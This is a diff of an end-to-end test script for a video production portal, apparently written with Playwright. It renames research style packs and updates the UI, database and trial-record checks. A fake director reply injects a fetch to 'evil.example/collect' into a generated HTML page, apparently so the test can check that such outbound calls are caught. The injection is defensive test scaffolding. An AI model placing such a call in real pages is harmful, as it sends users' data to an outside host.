@@ -12,6 +12,8 @@ import { totp } from "../apps/portal/lib/crypto/totp.ts";
 const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..");
 /** A pack's version as vendored in styles/lock.json, so the checks follow pack bumps instead of hard-coding them. */
 const LOCK = JSON.parse(readFileSync(path.join(ROOT, "styles", "lock.json"), "utf8"));
+// The research pack's own version, so the fabricated Hermes run matches the pack the Styles page shows.
+const RESEARCH_PACK_VERSION = JSON.parse(readFileSync(path.join(ROOT, "styles", "packs", "research-render", "style.json"), "utf8")).version;
 function packVersion(id) {
   const p = (LOCK.packs ?? []).find((x) => x.id === id);
   if (!p) throw new Error(`styles/lock.json has no pack ${id}`);
@@ -169,7 +171,7 @@ function directorReply(messages) {
     });
   }
   // Renderer hermes (research only): Hermes renders the whole video and publishes it under /clip/ on its media host.
-  // A research pack names its Hermes skill (claude-animation-skills, e.g. /graph): the fake records which skill arrived
+  // A research pack names its Hermes skill (claude-animation-skills, e.g. /dan-koe): the fake records which skill arrived
   // and answers with a real clip made for that skill.
   if (stage === "hermes-render") {
     fakeStats.hermesRenders++;
@@ -342,7 +344,7 @@ function directorReply(messages) {
     const retry = users.length > 1 ? textOf(users[users.length - 1].content) : "";
     if (retry) fakeStats.htmlDesignRetryNotes[tag] = retry;
     const { count, beat, seconds } = planNumbers(first);
-    const reference = readFileSync(path.join(ROOT, "styles", "packs", "hermes-designed-explainer", "render", "index.html"), "utf8");
+    const reference = readFileSync(path.join(ROOT, "styles", "packs", "designed-explainer", "render", "index.html"), "utf8");
     const html = retry ? reference : reference.replace("await document.fonts.ready;", "await document.fonts.ready; await fetch('https://evil.example/collect').catch(() => null);");
     return JSON.stringify({
       html,
@@ -677,7 +679,7 @@ function dbExec(sql) {
   return execFileSync("psql", [dbUrl, "-X", "-qtA", "-v", "ON_ERROR_STOP=1", "-c", sql], { encoding: "utf8", timeout: 20_000, stdio: ["ignore", "pipe", "pipe"] }).trim();
 }
 /** The first engine command pack (docs/hermes-handover.md): its version and environment, read from the vendored copy. */
-const ENV_PACK = "three-low-poly";
+const ENV_PACK = "low-poly-shapes";
 function envPackFacts() {
   const s = JSON.parse(readFileSync(path.join(ROOT, "styles", "packs", ENV_PACK, "style.json"), "utf8"));
   return { version: packVersion(ENV_PACK), cap: `env:${s.environment.id}@${s.environment.version}`, env: s.environment };
@@ -1048,7 +1050,7 @@ try {
   step("studio: queue a test render from Test render, let the worker run it, see the video");
   await page.getByRole("navigation", { name: "Studio" }).getByRole("link", { name: "Test render", exact: true }).click();
   await page.waitForURL(/\/studio\/test-render$/);
-  await page.selectOption("#test-style", "documentary-stills");
+  await page.selectOption("#test-style", "documentary");
   await page.selectOption("#test-format", "short");
   await page.getByRole("button", { name: "Queue test render", exact: true }).click();
   await page.waitForURL(/\/jobs\/[0-9a-f-]{36}$/);
@@ -1059,7 +1061,7 @@ try {
   await page.locator("video").first().waitFor();
   await shot("13b-test-render-desktop");
   await page.goto(`${APP}/studio/test-render`);
-  await page.getByTestId("saved-production").filter({ hasText: "Test render: Narrated documentary with stills" }).first().waitFor();
+  await page.getByTestId("saved-production").filter({ hasText: "Test render: Documentary" }).first().waitFor();
 
   step("assets: upload a reference video with its licence");
   const refPath = path.join(OUT, "reference.mp4");
@@ -1229,8 +1231,8 @@ try {
   await page.selectOption("#templateId", "tpl-explainer-flat-vector");
   await page.getByTestId("trial-style-explainer-flat-vector").getByText("Trial style", { exact: true }).waitFor();
   // The Hermes research pack is rendered by the portal, so it is offered here (only here) once Hermes is set up.
-  await page.selectOption("#templateId", "tpl-hermes-research-explainer");
-  await page.getByTestId("trial-style-hermes-research-explainer").getByTestId("hermes-render-label").getByText("Hermes render (research only)", { exact: true }).waitFor();
+  await page.selectOption("#templateId", "tpl-research-render");
+  await page.getByTestId("trial-style-research-render").getByTestId("hermes-render-label").getByText("Hermes render (research only)", { exact: true }).waitFor();
   await page.getByTestId("no-listed-styles").waitFor();
   const styleOptions = await page.locator("#templateId option").evaluateAll((os) => os.map((o) => o.value));
   for (const planned of ["tpl-kinetic-facts", "tpl-math-explainer", "tpl-blender-3d", "tpl-ai-character-sketch"]) {
@@ -1773,10 +1775,10 @@ try {
     // only the render, the quality check and the review run again. It is a trial of the Hermes research pack.
     const hermesRunId = prodRunId
       ? dbExec(`INSERT INTO pipeline_runs (channel_id, template_id, template_version, topic, autonomy_level, config, state)
-          SELECT channel_id, 'tpl-hermes-research-explainer', (SELECT current_version FROM templates WHERE id = 'tpl-hermes-research-explainer'),
+          SELECT channel_id, 'tpl-research-render', (SELECT current_version FROM templates WHERE id = 'tpl-research-render'),
                  topic || ' (Hermes render)', autonomy_level,
-                 jsonb_set(jsonb_set(config, '{styleId}', '"hermes-research-explainer"'), '{stylePack}',
-                   '{"id":"hermes-research-explainer","version":"0.2.0","status":"trial","trial":true,"engine":"hermes"}'), 'running'
+                 jsonb_set(jsonb_set(config, '{styleId}', '"research-render"'), '{stylePack}',
+                   '{"id":"research-render","version":"${RESEARCH_PACK_VERSION}","status":"trial","trial":true,"engine":"hermes"}'), 'running'
           FROM pipeline_runs WHERE id = '${prodRunId}' RETURNING id`)
       : null;
     if (!hermesRunId) console.log("   no database access (UI_DB unset): the Hermes render run is skipped");
@@ -1821,7 +1823,7 @@ try {
       }
       if (fakeStats.hermesRenders < 1 || fakeStats.clipDownloads < 1) throw new Error(`Hermes was asked ${fakeStats.hermesRenders} time(s) and its clip downloaded ${fakeStats.clipDownloads} time(s)`);
       const renderAsk = lastPrompt["hermes-render"] ?? "";
-      for (const want of ['"scenePlan"', '"contract"', '"shots"', '"id":"hermes-research-explainer"', "/clip/"]) {
+      for (const want of ['"scenePlan"', '"contract"', '"shots"', '"id":"research-render"', "/clip/"]) {
         if (!renderAsk.includes(want)) throw new Error(`the hermes-render request misses ${want}`);
       }
       // Hermes drew the picture; the only worker render is the one that laid the run's narration on it (hermes-mux).
@@ -1850,16 +1852,19 @@ try {
         if (logged && / (approved|rejected) /.test(logged)) break;
         await m.waitForTimeout(1000);
       }
-      if (!/^hermes-research-explainer@0\.2\.0 hermes 75 (approved|rejected) 60$/.test(logged ?? "")) {
+      if (!/^research-render@\d+\.\d+\.\d+ hermes 75 (approved|rejected) 60$/.test(logged ?? "")) {
         await dumpPipeline(m, hermesHref, "the Hermes render's trial outcome was not recorded");
         throw new Error(`the Hermes render's curation entry is "${logged}"`);
       }
       await page.goto(`${APP}${hermesHref}`);
       await page.getByTestId("hermes-render-badge").getByText("Hermes render (research only)", { exact: true }).waitFor();
       await page.goto(`${APP}/studio/styles`);
-      const hermesPack = page.getByTestId("style-pack-hermes-research-explainer");
+      const hermesPack = page.getByTestId("style-pack-research-render");
       await hermesPack.getByTestId("pack-availability").getByText("Rendered by the portal through Hermes", { exact: true }).waitFor();
-      await hermesPack.getByTestId("trial-record").getByText(/^Trial runs of v0\.2\.0: 1 .*mean presentation 75 \(1 scored\)/).waitFor();
+      console.log(`   research-render curated entry: ${logged}`);
+      const recordText = await hermesPack.getByTestId("trial-record").innerText();
+      console.log(`   research-render trial record: ${recordText}`);
+      await hermesPack.getByTestId("trial-record").getByText(/^Trial runs of v\d+\.\d+\.\d+: \d+ .*mean presentation 75 \(1 scored\)/).waitFor();
       await shot("15c-styles-hermes-desktop");
     }
   }
@@ -1867,7 +1872,19 @@ try {
   // Research styles and lab trials (docs/style-packs.md, "Research styles and lab trials"). Runs below reuse the finished
   // production's approved script, storyboard, pictures and narration (copied rows), so only the render, the quality
   // check and the review run again.
-  const RESEARCH_SKILLS = ["breakdown", "dan-koe", "graph", "kurzgesagt", "low-poly", "map-route", "minecraft", "minimalistic-graphics", "stick-figure", "zach-d-films"];
+  // The research styles, by the id each look has now and the skill Hermes runs behind it. The Graph, minimal-line-art
+  // and Minecraft variants are retired: a worker renders those looks itself, so they are no longer offered here.
+  const RESEARCH = [
+    ["exploded-view", "breakdown"],
+    ["branching-lines", "dan-koe"],
+    ["flat-space", "kurzgesagt"],
+    ["map-route", "map-route"],
+    ["ps1-low-poly", "low-poly"],
+    ["stick-figure", "stick-figure"],
+    ["what-if-3d", "zach-d-films"],
+  ];
+  const RETIRED_RESEARCH = ["line-graph-skill", "step-line-art-skill", "voxel-build-skill"];
+  const researchIdOf = (skill) => RESEARCH.find(([, s]) => s === skill)?.[0] ?? null;
   const RESEARCH_GROUP = "Hermes research styles (from claude-animation-skills)";
   const prodRunIdForTrials = /([0-9a-f-]{36})$/.exec(productionRunHref ?? "")?.[1] ?? "";
   /** Points a freshly started run at the production's approved stages, with only the render left to do. */
@@ -1969,12 +1986,19 @@ async function scoreAndDecide(runId, stars, shown) {
     const groups = await page.locator("#templateId optgroup").evaluateAll((gs) => gs.map((g) => g.label));
     if (!groups.includes(RESEARCH_GROUP)) throw new Error(`no research group in the style list: ${groups.join(", ")}`);
     const optionIds = (await page.locator(`#templateId optgroup[label="${RESEARCH_GROUP}"] option`).evaluateAll((os) => os.map((o) => o.value))).sort();
-    const want = RESEARCH_SKILLS.map((s) => `tpl-hermes-${s}`).sort();
+    // The seven research looks share the group; the generic Hermes render has no skill behind it, so it sits in the
+    // plain trial group below (style-registry researchGroupOf needs pack.hermes).
+    const want = RESEARCH.map(([id]) => id).map((id) => `tpl-${id}`).sort();
     if (JSON.stringify(optionIds) !== JSON.stringify(want)) throw new Error(`the research group offers ${optionIds.join(", ")}, expected ${want.join(", ")}`);
+    const plainTrials = await page.locator(`#templateId optgroup[label="Trial styles (research only, not for publishing)"] option`).evaluateAll((os) => os.map((o) => o.value));
+    if (!plainTrials.includes("tpl-research-render")) throw new Error(`the plain trial group does not offer tpl-research-render: ${plainTrials.join(", ")}`);
     // Choosing one shows its provenance in the panel: badged, described with its skill path, credited (MIT).
-    for (const s of RESEARCH_SKILLS) {
-      await page.selectOption("#templateId", `tpl-hermes-${s}`);
-      const panel = page.getByTestId(`trial-style-hermes-${s}`);
+    for (const id of RETIRED_RESEARCH) {
+      if (optionIds.includes(`tpl-${id}`)) throw new Error(`the retired variant ${id} is still offered in the style list`);
+    }
+    for (const [id, s] of RESEARCH) {
+      await page.selectOption("#templateId", `tpl-${id}`);
+      const panel = page.getByTestId(`trial-style-${id}`);
       await panel.getByTestId("hermes-render-label").getByText("Hermes render (research only)", { exact: true }).waitFor();
       await panel.getByTestId("trial-style-credit").getByText("From claude-animation-skills by Artem Novitckii (MIT).", { exact: true }).waitFor();
       if (!((await panel.getByTestId("trial-style-about").innerText()).includes(`/${s}`))) throw new Error(`the ${s} research style does not name its skill in its description`);
@@ -1993,15 +2017,15 @@ async function scoreAndDecide(runId, stars, shown) {
     await batchBox.locator("summary").click();
     await batchBox.locator("#batchChannelId").selectOption({ label: "Myth Stories" });
     await batchBox.locator("#batchBrief").fill("Batch trial: one thing that compounds");
-    await batchBox.getByRole("checkbox", { name: "Try Line graph (Hermes /graph)", exact: true }).check();
-    await batchBox.getByRole("checkbox", { name: "Try Branching line art (Hermes /dan-koe)", exact: true }).check();
+    await batchBox.getByRole("checkbox", { name: "Try Exploded View", exact: true }).check();
+    await batchBox.getByRole("checkbox", { name: "Try Dan Koe", exact: true }).check();
     await batchBox.getByRole("button", { name: "Start 2 trials", exact: true }).click();
     await batchBox.getByTestId("batch-started").getByText(/^2 trial runs started from one brief\. Hermes works through them one ask at a time\.$/).waitFor();
     const hrefs = await batchBox.getByTestId("batch-run-link").evaluateAll((as) => as.map((a) => a.getAttribute("href")));
     const batchIds = hrefs.map((h) => /([0-9a-f-]{36})$/.exec(h ?? "")?.[1]).filter(Boolean);
     if (batchIds.length !== 2) throw new Error(`the batch started ${batchIds.length} run(s): ${hrefs.join(", ")}`);
     const stored = dbValue(`SELECT string_agg((config->'stylePack'->>'id') || ':' || (config->'stylePack'->>'trial') || ':' || (config->'trialBatch'->>'index') || '/' || (config->'trialBatch'->>'total'), ' ' ORDER BY (config->'trialBatch'->>'index')) FROM pipeline_runs WHERE id IN ('${batchIds.join("','")}')`);
-    if (stored !== null && stored !== "hermes-graph:true:1/2 hermes-dan-koe:true:2/2") throw new Error(`the batch runs are stored as "${stored}"`);
+    if (stored !== null && stored !== "exploded-view:true:1/2 branching-lines:true:2/2") throw new Error(`the batch runs are stored as "${stored}"`);
     // The queue shows both runs, in batch order.
     await page.goto(`${APP}/studio/styles`);
     const queue = page.getByTestId("trial-queue");
@@ -2011,27 +2035,27 @@ async function scoreAndDecide(runId, stars, shown) {
     if (!prodRunIdForTrials || stored === null) console.log("   no database access (UI_DB unset) or no finished production: the batch renders are skipped");
     else {
       const before = fakeStats.hermesSkills.length;
-      // Approve anyway: the /graph trial's final check is made to fail one check the owner may waive. Its template's
+      // Approve anyway: the /breakdown trial's final check is made to fail one check the owner may waive. Its template's
       // hook window (read only by the quality check, never by the render) is set to 1 ms while the two runs are rendered
       // and checked, then put back. The /dan-koe run has its own template and is not touched.
       const waiveRun = batchIds[0];
       const waiveTpl = dbValue(`SELECT template_id FROM pipeline_runs WHERE id = '${waiveRun}'`) ?? "";
-      if (!waiveTpl || waiveTpl === dbValue(`SELECT template_id FROM pipeline_runs WHERE id = '${batchIds[1]}'`)) throw new Error(`the /graph batch run's template "${waiveTpl}" is not its own`);
-      if (dbValue(`SELECT coalesce(config->>'format', 'short') FROM pipeline_runs WHERE id = '${waiveRun}'`) !== "short") throw new Error("the /graph batch run is not a short: the hook window does not apply");
+      if (!waiveTpl || waiveTpl === dbValue(`SELECT template_id FROM pipeline_runs WHERE id = '${batchIds[1]}'`)) throw new Error(`the /breakdown batch run's template "${waiveTpl}" is not its own`);
+      if (dbValue(`SELECT coalesce(config->>'format', 'short') FROM pipeline_runs WHERE id = '${waiveRun}'`) !== "short") throw new Error("the /breakdown batch run is not a short: the hook window does not apply");
       const tplVersion = `FROM templates t WHERE t.id = v.template_id AND v.version = t.current_version AND t.id = '${waiveTpl}'`;
       const hookBefore = dbValue(`SELECT coalesce(v.spec->'pacing'->>'hookByMs', '') FROM template_versions v, templates t WHERE t.id = v.template_id AND v.version = t.current_version AND t.id = '${waiveTpl}'`) ?? "";
       if (!/^\d+$/.test(hookBefore)) throw new Error(`the ${waiveTpl} template has no hook window ("${hookBefore}")`);
       dbExec(`UPDATE template_versions v SET spec = jsonb_set(v.spec, '{pacing,hookByMs}', '1'::jsonb) ${tplVersion}`);
       try {
-        await reuseProduction(batchIds[0], "batch trial /graph");
+        await reuseProduction(batchIds[0], "batch trial /breakdown");
         await reuseProduction(batchIds[1], "batch trial /dan-koe");
         await driveToQc(batchIds, "batch trial");
       } finally {
         dbExec(`UPDATE template_versions v SET spec = jsonb_set(v.spec, '{pacing,hookByMs}', '${hookBefore}'::jsonb) ${tplVersion}`);
       }
       const skills = fakeStats.hermesSkills.slice(before).sort();
-      if (JSON.stringify(skills) !== JSON.stringify(["/dan-koe", "/graph"])) throw new Error(`Hermes was asked to render with ${skills.join(", ") || "no skill"}, expected /graph and /dan-koe`);
-      for (const [id, skill] of [[batchIds[0], "graph"], [batchIds[1], "dan-koe"]]) {
+      if (JSON.stringify(skills) !== JSON.stringify(["/breakdown", "/dan-koe"])) throw new Error(`Hermes was asked to render with ${skills.join(", ") || "no skill"}, expected /breakdown and /dan-koe`);
+      for (const [id, skill] of [[batchIds[0], "breakdown"], [batchIds[1], "dan-koe"]]) {
         const prov = hermesMuxFacts(id, `the ${skill} render`).pictureSkill;
         if (!new RegExp(`^hermes-render capcut /${skill} http://127\\.0\\.0\\.1:\\d+/clip/${skill}-\\d+\\.mp4$`).test(prov)) throw new Error(`the ${skill} render's picture provenance is "${prov}"`);
         const card = cardOf(id, "qc").first();
@@ -2039,17 +2063,17 @@ async function scoreAndDecide(runId, stars, shown) {
         await card.getByTestId("trial-badge").getByText("Trial style", { exact: true }).waitFor();
       }
       {
-        // The /graph trial's final check failed the hook window (a check the owner may waive) and nothing that is never
+        // The /breakdown trial's final check failed the hook window (a check the owner may waive) and nothing that is never
         // waived: its card has no plain Approve, says why, and offers the owner Approve anyway naming the failed check.
         const techIssues = dbValue(`SELECT details->'issues' FROM qc_reports WHERE run_id = '${waiveRun}' AND gate = 'G-technical' ORDER BY created_at DESC LIMIT 1`) ?? "";
         if (!/hook window/.test(techIssues) || /audio is silent|no audio stream|commercial-use terms|cannot be published/.test(techIssues)) {
-          await dumpPipeline(m, `/studio/runs/${waiveRun}`, "the /graph trial's quality check did not fail only waivable checks");
-          throw new Error(`the /graph trial's G-technical issues are ${techIssues}`);
+          await dumpPipeline(m, `/studio/runs/${waiveRun}`, "the /breakdown trial's quality check did not fail only waivable checks");
+          throw new Error(`the /breakdown trial's G-technical issues are ${techIssues}`);
         }
         await m.goto(`${APP}/review`);
         const card = cardOf(waiveRun, "qc").first();
-        if ((await card.getAttribute("data-kind")) !== "gate-failure") throw new Error(`the /graph trial's final card is "${await card.getAttribute("data-kind")}", not a failed check`);
-        if ((await checkQcChoices(waiveRun, card, "the /graph trial (waived)")) !== "fail") throw new Error("the /graph trial's gates did not fail");
+        if ((await card.getAttribute("data-kind")) !== "gate-failure") throw new Error(`the /breakdown trial's final card is "${await card.getAttribute("data-kind")}", not a failed check`);
+        if ((await checkQcChoices(waiveRun, card, "the /breakdown trial (waived)")) !== "fail") throw new Error("the /breakdown trial's gates did not fail");
         await card
           .getByTestId("qc-failure-note")
           .getByText(/^The quality check failed: (.+, )?hook window(, .+)?\. You can approve anyway; it is recorded\. Save your score first; the curation record marks the check as waived\.$/)
@@ -2085,24 +2109,24 @@ async function scoreAndDecide(runId, stars, shown) {
         }
         if (waivedRow !== "done approved true approved true true false 75") {
           await dumpPipeline(m, `/studio/runs/${waiveRun}`, "Approve anyway was not recorded as a waived approval");
-          throw new Error(`after Approve anyway the /graph trial reads "${waivedRow}", expected "done approved true approved true true false 75"`);
+          throw new Error(`after Approve anyway the /breakdown trial reads "${waivedRow}", expected "done approved true approved true true false 75"`);
         }
         const audited = dbValue(`SELECT count(*) FROM audit_log WHERE action = 'review.override' AND target = '${reviewId}' AND detail->>'waived' = 'quality check' AND detail->>'runId' = '${waiveRun}'`);
-        if (audited !== "1") throw new Error(`Approve anyway on the /graph trial has ${audited} audit row(s)`);
+        if (audited !== "1") throw new Error(`Approve anyway on the /breakdown trial has ${audited} audit row(s)`);
       }
       await scoreAndDecide(batchIds[1], { hook: 5, pacing: 5, legibility: 5, polish: 5, audio: 5 }, "100/100 by the owner");
       await shot("29b-review-batch-scored-mobile", m);
       await page.goto(`${APP}/studio/styles`);
       await page.getByTestId("lifecycle").getByText("Trial packs collect evidence toward Proven.", { exact: true }).waitFor();
       const research = page.getByTestId("style-group-research");
-      // The /graph trial was approved anyway: counted as a trial, shown as waived, never as a technical pass.
-      const graphRecord = research.getByTestId("style-pack-hermes-graph").getByTestId("trial-record");
+      // The /breakdown trial was approved anyway: counted as a trial, shown as waived, never as a technical pass.
+      const graphRecord = research.getByTestId("style-pack-exploded-view").getByTestId("trial-record");
       await graphRecord.getByText(/^Trial runs of v0\.2\.0: 1 · technical pass 0% \(1 waived by the owner, not counted as a pass\) · mean presentation 75 \(1 scored\) · owner approved 1, rejected 0$/).waitFor();
       await graphRecord.getByTestId("trial-waived").waitFor();
       await graphRecord.getByTestId("promotion-issues").getByText("1 of 1 trial run(s) were approved with the quality check waived; a waived check never counts as a technical pass", { exact: true }).waitFor();
-      await research.getByTestId("style-pack-hermes-graph").getByTestId("outcome-qc-waived").waitFor({ state: "attached" });
-      await research.getByTestId("style-pack-hermes-dan-koe").getByTestId("trial-record").getByText(/^Trial runs of v0\.2\.0: 1 .*mean presentation 100 \(1 scored\)/).waitFor();
-      await research.getByTestId("style-pack-hermes-graph").getByTestId("pack-hermes-skill").getByText(/^Hermes skill \/graph, a quick skill from a small spec/).waitFor();
+      await research.getByTestId("style-pack-exploded-view").getByTestId("outcome-qc-waived").waitFor({ state: "attached" });
+      await research.getByTestId("style-pack-branching-lines").getByTestId("trial-record").getByText(/^Trial runs of v0\.2\.0: 1 .*mean presentation 100 \(1 scored\)/).waitFor();
+      await research.getByTestId("style-pack-exploded-view").getByTestId("pack-hermes-skill").getByText(/^Hermes skill \/breakdown, a quick skill from a small spec/).waitFor();
       await shot("29c-styles-research-scored-desktop");
       // Nothing from these runs is publishable: research only, never an upload or publish step.
       for (const id of batchIds) {
@@ -2120,7 +2144,8 @@ async function scoreAndDecide(runId, stars, shown) {
     const ciOn = process.env.CI === "true" || process.env.CI === "1";
     if (!prodRunIdForTrials || dbValue("SELECT 1") === null) console.log("   no database access (UI_DB unset) or no finished production: the async render step is skipped");
     else {
-      const packId = `hermes-${ASYNC_RENDER_SKILL.slice(1)}`;
+      const packId = researchIdOf(ASYNC_RENDER_SKILL.slice(1));
+      if (!packId) throw new Error(`no research style runs ${ASYNC_RENDER_SKILL} any more`);
       // The run reuses the finished production's approved stages (copied rows), like the Hermes render step above; only
       // the render, the quality check and the review run again. A trial of a research pack whose narration is the run's.
       const asyncRunId = dbExec(`INSERT INTO pipeline_runs (channel_id, template_id, template_version, topic, autonomy_level, config, state)
@@ -2253,7 +2278,7 @@ async function scoreAndDecide(runId, stars, shown) {
     await shot("30-styles-lab-trial-desktop");
     await tryIt.click();
     await page.waitForURL(/\/studio\/new\?lab=probe-line-graph$/);
-    await page.getByTestId("lab-trial-start-note").getByText(/^Lab trial \(draft pack\): Probe: line graph \(html-capture\) 0\.1\.1 is lab\./).waitFor();
+    await page.getByTestId("lab-trial-start-note").getByText(/^Lab trial \(draft pack\): Line Graph \(Probe\) 0\.1\.1 is lab\./).waitFor();
     if ((await page.locator("#templateId").inputValue()) !== "tpl-probe-line-graph") throw new Error("New Video is not pre-filled with the lab pack");
     await page.getByTestId("lab-trial-note").waitFor();
     await page.selectOption("#channelId", { label: "Myth Stories" });
@@ -2364,7 +2389,7 @@ async function scoreAndDecide(runId, stars, shown) {
     } else {
       const researchMs = Math.max(1000, Math.round(600_000 * scale));
       const within = researchMs >= 60_000 ? `${Math.round(researchMs / 60_000)} min` : `${Math.round(researchMs / 1000)} s`;
-      const runId = await startFromNewVideo("tpl-animated-line-graph", `${SLOW_RESEARCH}: how solar capacity grew`, "Workflow: Scene spec (data-driven, no pictures): Idea → Research → Script → Scene spec → Preview → Voice → Video → Quality check");
+      const runId = await startFromNewVideo("tpl-line-graph", `${SLOW_RESEARCH}: how solar capacity grew`, "Workflow: Scene spec (data-driven, no pictures): Idea → Research → Script → Scene spec → Preview → Voice → Video → Quality check");
       const runHref = `/studio/runs/${runId}`;
       const researchRow = () => dbValue(`SELECT state || ' ' || attempt || ' ' || coalesce(output->'hermesWait'->>'reason', '-') || ' ' || (not_before IS NOT NULL)::text FROM pipeline_stages WHERE run_id = '${runId}' AND stage = 'research' ORDER BY attempt DESC LIMIT 1`) ?? "";
       // The idea: approve one on this run's card.
@@ -2436,14 +2461,14 @@ async function scoreAndDecide(runId, stars, shown) {
     }
   }
 
-  step("scene-spec trial: animated-line-graph from New Video goes idea → research → script → scene spec → preview stills → voice → html-capture render → qc, with no picture made");
+  step("scene-spec trial: line-graph from New Video goes idea → research → script → scene spec → preview stills → voice → html-capture render → qc, with no picture made");
   if (dbValue("SELECT 1") === null) console.log("   no database access (UI_DB unset): the scene-spec run is skipped");
   else {
     const brief = "Scene spec trial: how solar capacity grew";
     const imagesBefore = imageAskTotal();
     const specAsksBefore = fakeStats.sceneSpecAsks;
     const dataAsksBefore = fakeStats.researchDataAsks;
-    const runId = await startFromNewVideo("tpl-animated-line-graph", brief, "Workflow: Scene spec (data-driven, no pictures): Idea → Research → Script → Scene spec → Preview → Voice → Video → Quality check");
+    const runId = await startFromNewVideo("tpl-line-graph", brief, "Workflow: Scene spec (data-driven, no pictures): Idea → Research → Script → Scene spec → Preview → Voice → Video → Quality check");
     const flow = dbValue(`SELECT (config->'workflow'->>'recipe') || ' ' || (config->'workflow'->'stages')::text || ' ' || (config->'workflow'->'review')::text FROM pipeline_runs WHERE id = '${runId}'`);
     if (flow !== 'scene-spec ["idea", "research", "script", "scene-spec", "preview", "voice", "render", "qc"] ["scene-spec", "preview"]') throw new Error(`the scene-spec run stored the workflow "${flow}"`);
     let specCard = false;
@@ -2474,7 +2499,7 @@ async function scoreAndDecide(runId, stars, shown) {
     // The preview job: this run's, under the pack's capability, done before the render job was even queued.
     const pj = dbValue(`SELECT p.capability || ' ' || p.status || ' ' || (p.created_at < r.created_at)::text || ' ' || (SELECT count(*) FROM artifacts a WHERE a.job_id = p.id AND a.name LIKE 'still-%')
       FROM jobs p, jobs r WHERE p.type = 'preview-frames' AND p.payload->>'runId' = '${runId}' AND r.type = 'render-video' AND r.payload->>'runId' = '${runId}' ORDER BY p.created_at DESC, r.created_at DESC LIMIT 1`);
-    if (pj !== `pack:animated-line-graph@${packVersion("animated-line-graph")} succeeded true 6`) throw new Error(`the scene-spec preview job is "${pj}"`);
+    if (pj !== `pack:line-graph@${packVersion("line-graph")} succeeded true 6`) throw new Error(`the scene-spec preview job is "${pj}"`);
     if (fakeStats.researchDataAsks <= dataAsksBefore) throw new Error("the scene-spec run's research did not ask for the numbers the spec needs");
     if (fakeStats.sceneSpecAsks <= specAsksBefore) throw new Error("Hermes was never asked for the scene spec");
     if (!/On-screen elements this style allows: heading, counter, bar\./.test(lastPrompt["scene-spec"] ?? "")) throw new Error("the scene-spec prompt does not carry the pack's elements");
@@ -2489,7 +2514,7 @@ async function scoreAndDecide(runId, stars, shown) {
     console.log(`   image asks while the scene-spec run ran, any run: ${imageAskTotal() - imagesBefore}`);
     // The real html-capture render through the CI worker, from the spec: the pack's page, the sourced series, one plate.
     const job = dbValue(`SELECT capability || ' ' || (payload->>'engine') || ' ' || (payload->'scenePlan'->>'template') || ' ' || (payload->'scenePlan'->'scenes'->1->'elements'->0->'series')::text FROM jobs WHERE type = 'render-video' AND payload->>'runId' = '${runId}' ORDER BY created_at DESC LIMIT 1`);
-    if (job !== `pack:animated-line-graph@${packVersion("animated-line-graph")} html-capture animated-line-graph [40, 140, 500, 1200]`) throw new Error(`the scene-spec render job is "${job}"`);
+    if (job !== `pack:line-graph@${packVersion("line-graph")} html-capture line-graph [40, 140, 500, 1200]`) throw new Error(`the scene-spec render job is "${job}"`);
     const plates = dbValue(`SELECT count(DISTINCT s->>'assetId') || ' ' || (SELECT count(*) FROM assets WHERE metadata->>'runId' = '${runId}' AND metadata->>'executor' = 'portal-plate' AND source = 'generated')
       FROM jobs j, jsonb_array_elements(j.payload->'shots') s WHERE j.type = 'render-video' AND j.payload->>'runId' = '${runId}'`);
     if (plates !== "1 1") throw new Error(`the scene-spec render should use one portal plate for every shot: "${plates}"`);
@@ -2500,7 +2525,7 @@ async function scoreAndDecide(runId, stars, shown) {
     await card.getByTestId("trial-badge").getByText("Trial style", { exact: true }).waitFor();
     await scoreAndDecide(runId, { hook: 4, pacing: 4, legibility: 4, polish: 4, audio: 4 }, "75/100 by the owner");
     const logged = dbValue(`SELECT pack_id || '@' || pack_version || ' ' || coalesce(renderer, '?') || ' ' || coalesce(presentation_score::text, 'none') FROM style_trial_outcomes WHERE run_id = '${runId}'`);
-    if (logged !== `animated-line-graph@${packVersion("animated-line-graph")} html-capture 75`) throw new Error(`the scene-spec trial's curation row is "${logged}"`);
+    if (logged !== `line-graph@${packVersion("line-graph")} html-capture 75`) throw new Error(`the scene-spec trial's curation row is "${logged}"`);
     // The run page shows the run's own list, and no work orders.
     await page.goto(`${APP}/studio/runs/${runId}`);
     const wf = page.locator('[data-testid="run-workflow"][data-recipe="scene-spec"]');
@@ -2517,13 +2542,13 @@ async function scoreAndDecide(runId, stars, shown) {
   else {
     const brief = "HTML design trial: why the sky is blue";
     const tag = brief.slice(0, 60);
-    const ver = packVersion("hermes-designed-explainer");
+    const ver = packVersion("designed-explainer");
     // New Video offers it only in the Trial section, with its research-only badge.
     await page.goto(`${APP}/studio/new`);
-    await page.selectOption("#templateId", "tpl-hermes-designed-explainer");
-    const row = page.getByTestId("trial-style-hermes-designed-explainer");
+    await page.selectOption("#templateId", "tpl-designed-explainer");
+    const row = page.getByTestId("trial-style-designed-explainer");
     await row.getByTestId("html-design-label").getByText("Hermes-designed page (research only)", { exact: true }).waitFor();
-    const runId = await startFromNewVideo("tpl-hermes-designed-explainer", brief, "Workflow: Hermes-designed page (research only, no pictures): Idea → Research → Script → HTML design → Preview → Voice → Video → Quality check");
+    const runId = await startFromNewVideo("tpl-designed-explainer", brief, "Workflow: Hermes-designed page (research only, no pictures): Idea → Research → Script → HTML design → Preview → Voice → Video → Quality check");
     const flow = dbValue(`SELECT (config->'workflow'->>'recipe') || ' ' || (config->'workflow'->'stages')::text || ' ' || (config->'workflow'->'review')::text || ' ' || (config->'stylePack'->>'trial') || ' ' || (config->'stylePack'->>'designed') FROM pipeline_runs WHERE id = '${runId}'`);
     if (flow !== 'html-design ["idea", "research", "script", "html-design", "preview", "voice", "render", "qc"] ["html-design", "preview"] true true') throw new Error(`the html-design run stored "${flow}"`);
     let designCard = false;
@@ -2565,7 +2590,7 @@ async function scoreAndDecide(runId, stars, shown) {
     // The preview and the render both carry that page, under the pack's capability; the render came after the stills.
     const jobs = dbValue(`SELECT p.capability || ' ' || p.status || ' ' || (p.payload->'preview'->>'page') || ' ' || r.capability || ' ' || (r.payload->'page'->>'assetId') || ' ' || (p.created_at < r.created_at)::text || ' ' || coalesce(r.result->'page'->>'designed', 'none')
       FROM jobs p, jobs r WHERE p.type = 'preview-frames' AND p.payload->>'runId' = '${runId}' AND r.type = 'render-video' AND r.payload->>'runId' = '${runId}' ORDER BY p.created_at DESC, r.created_at DESC LIMIT 1`);
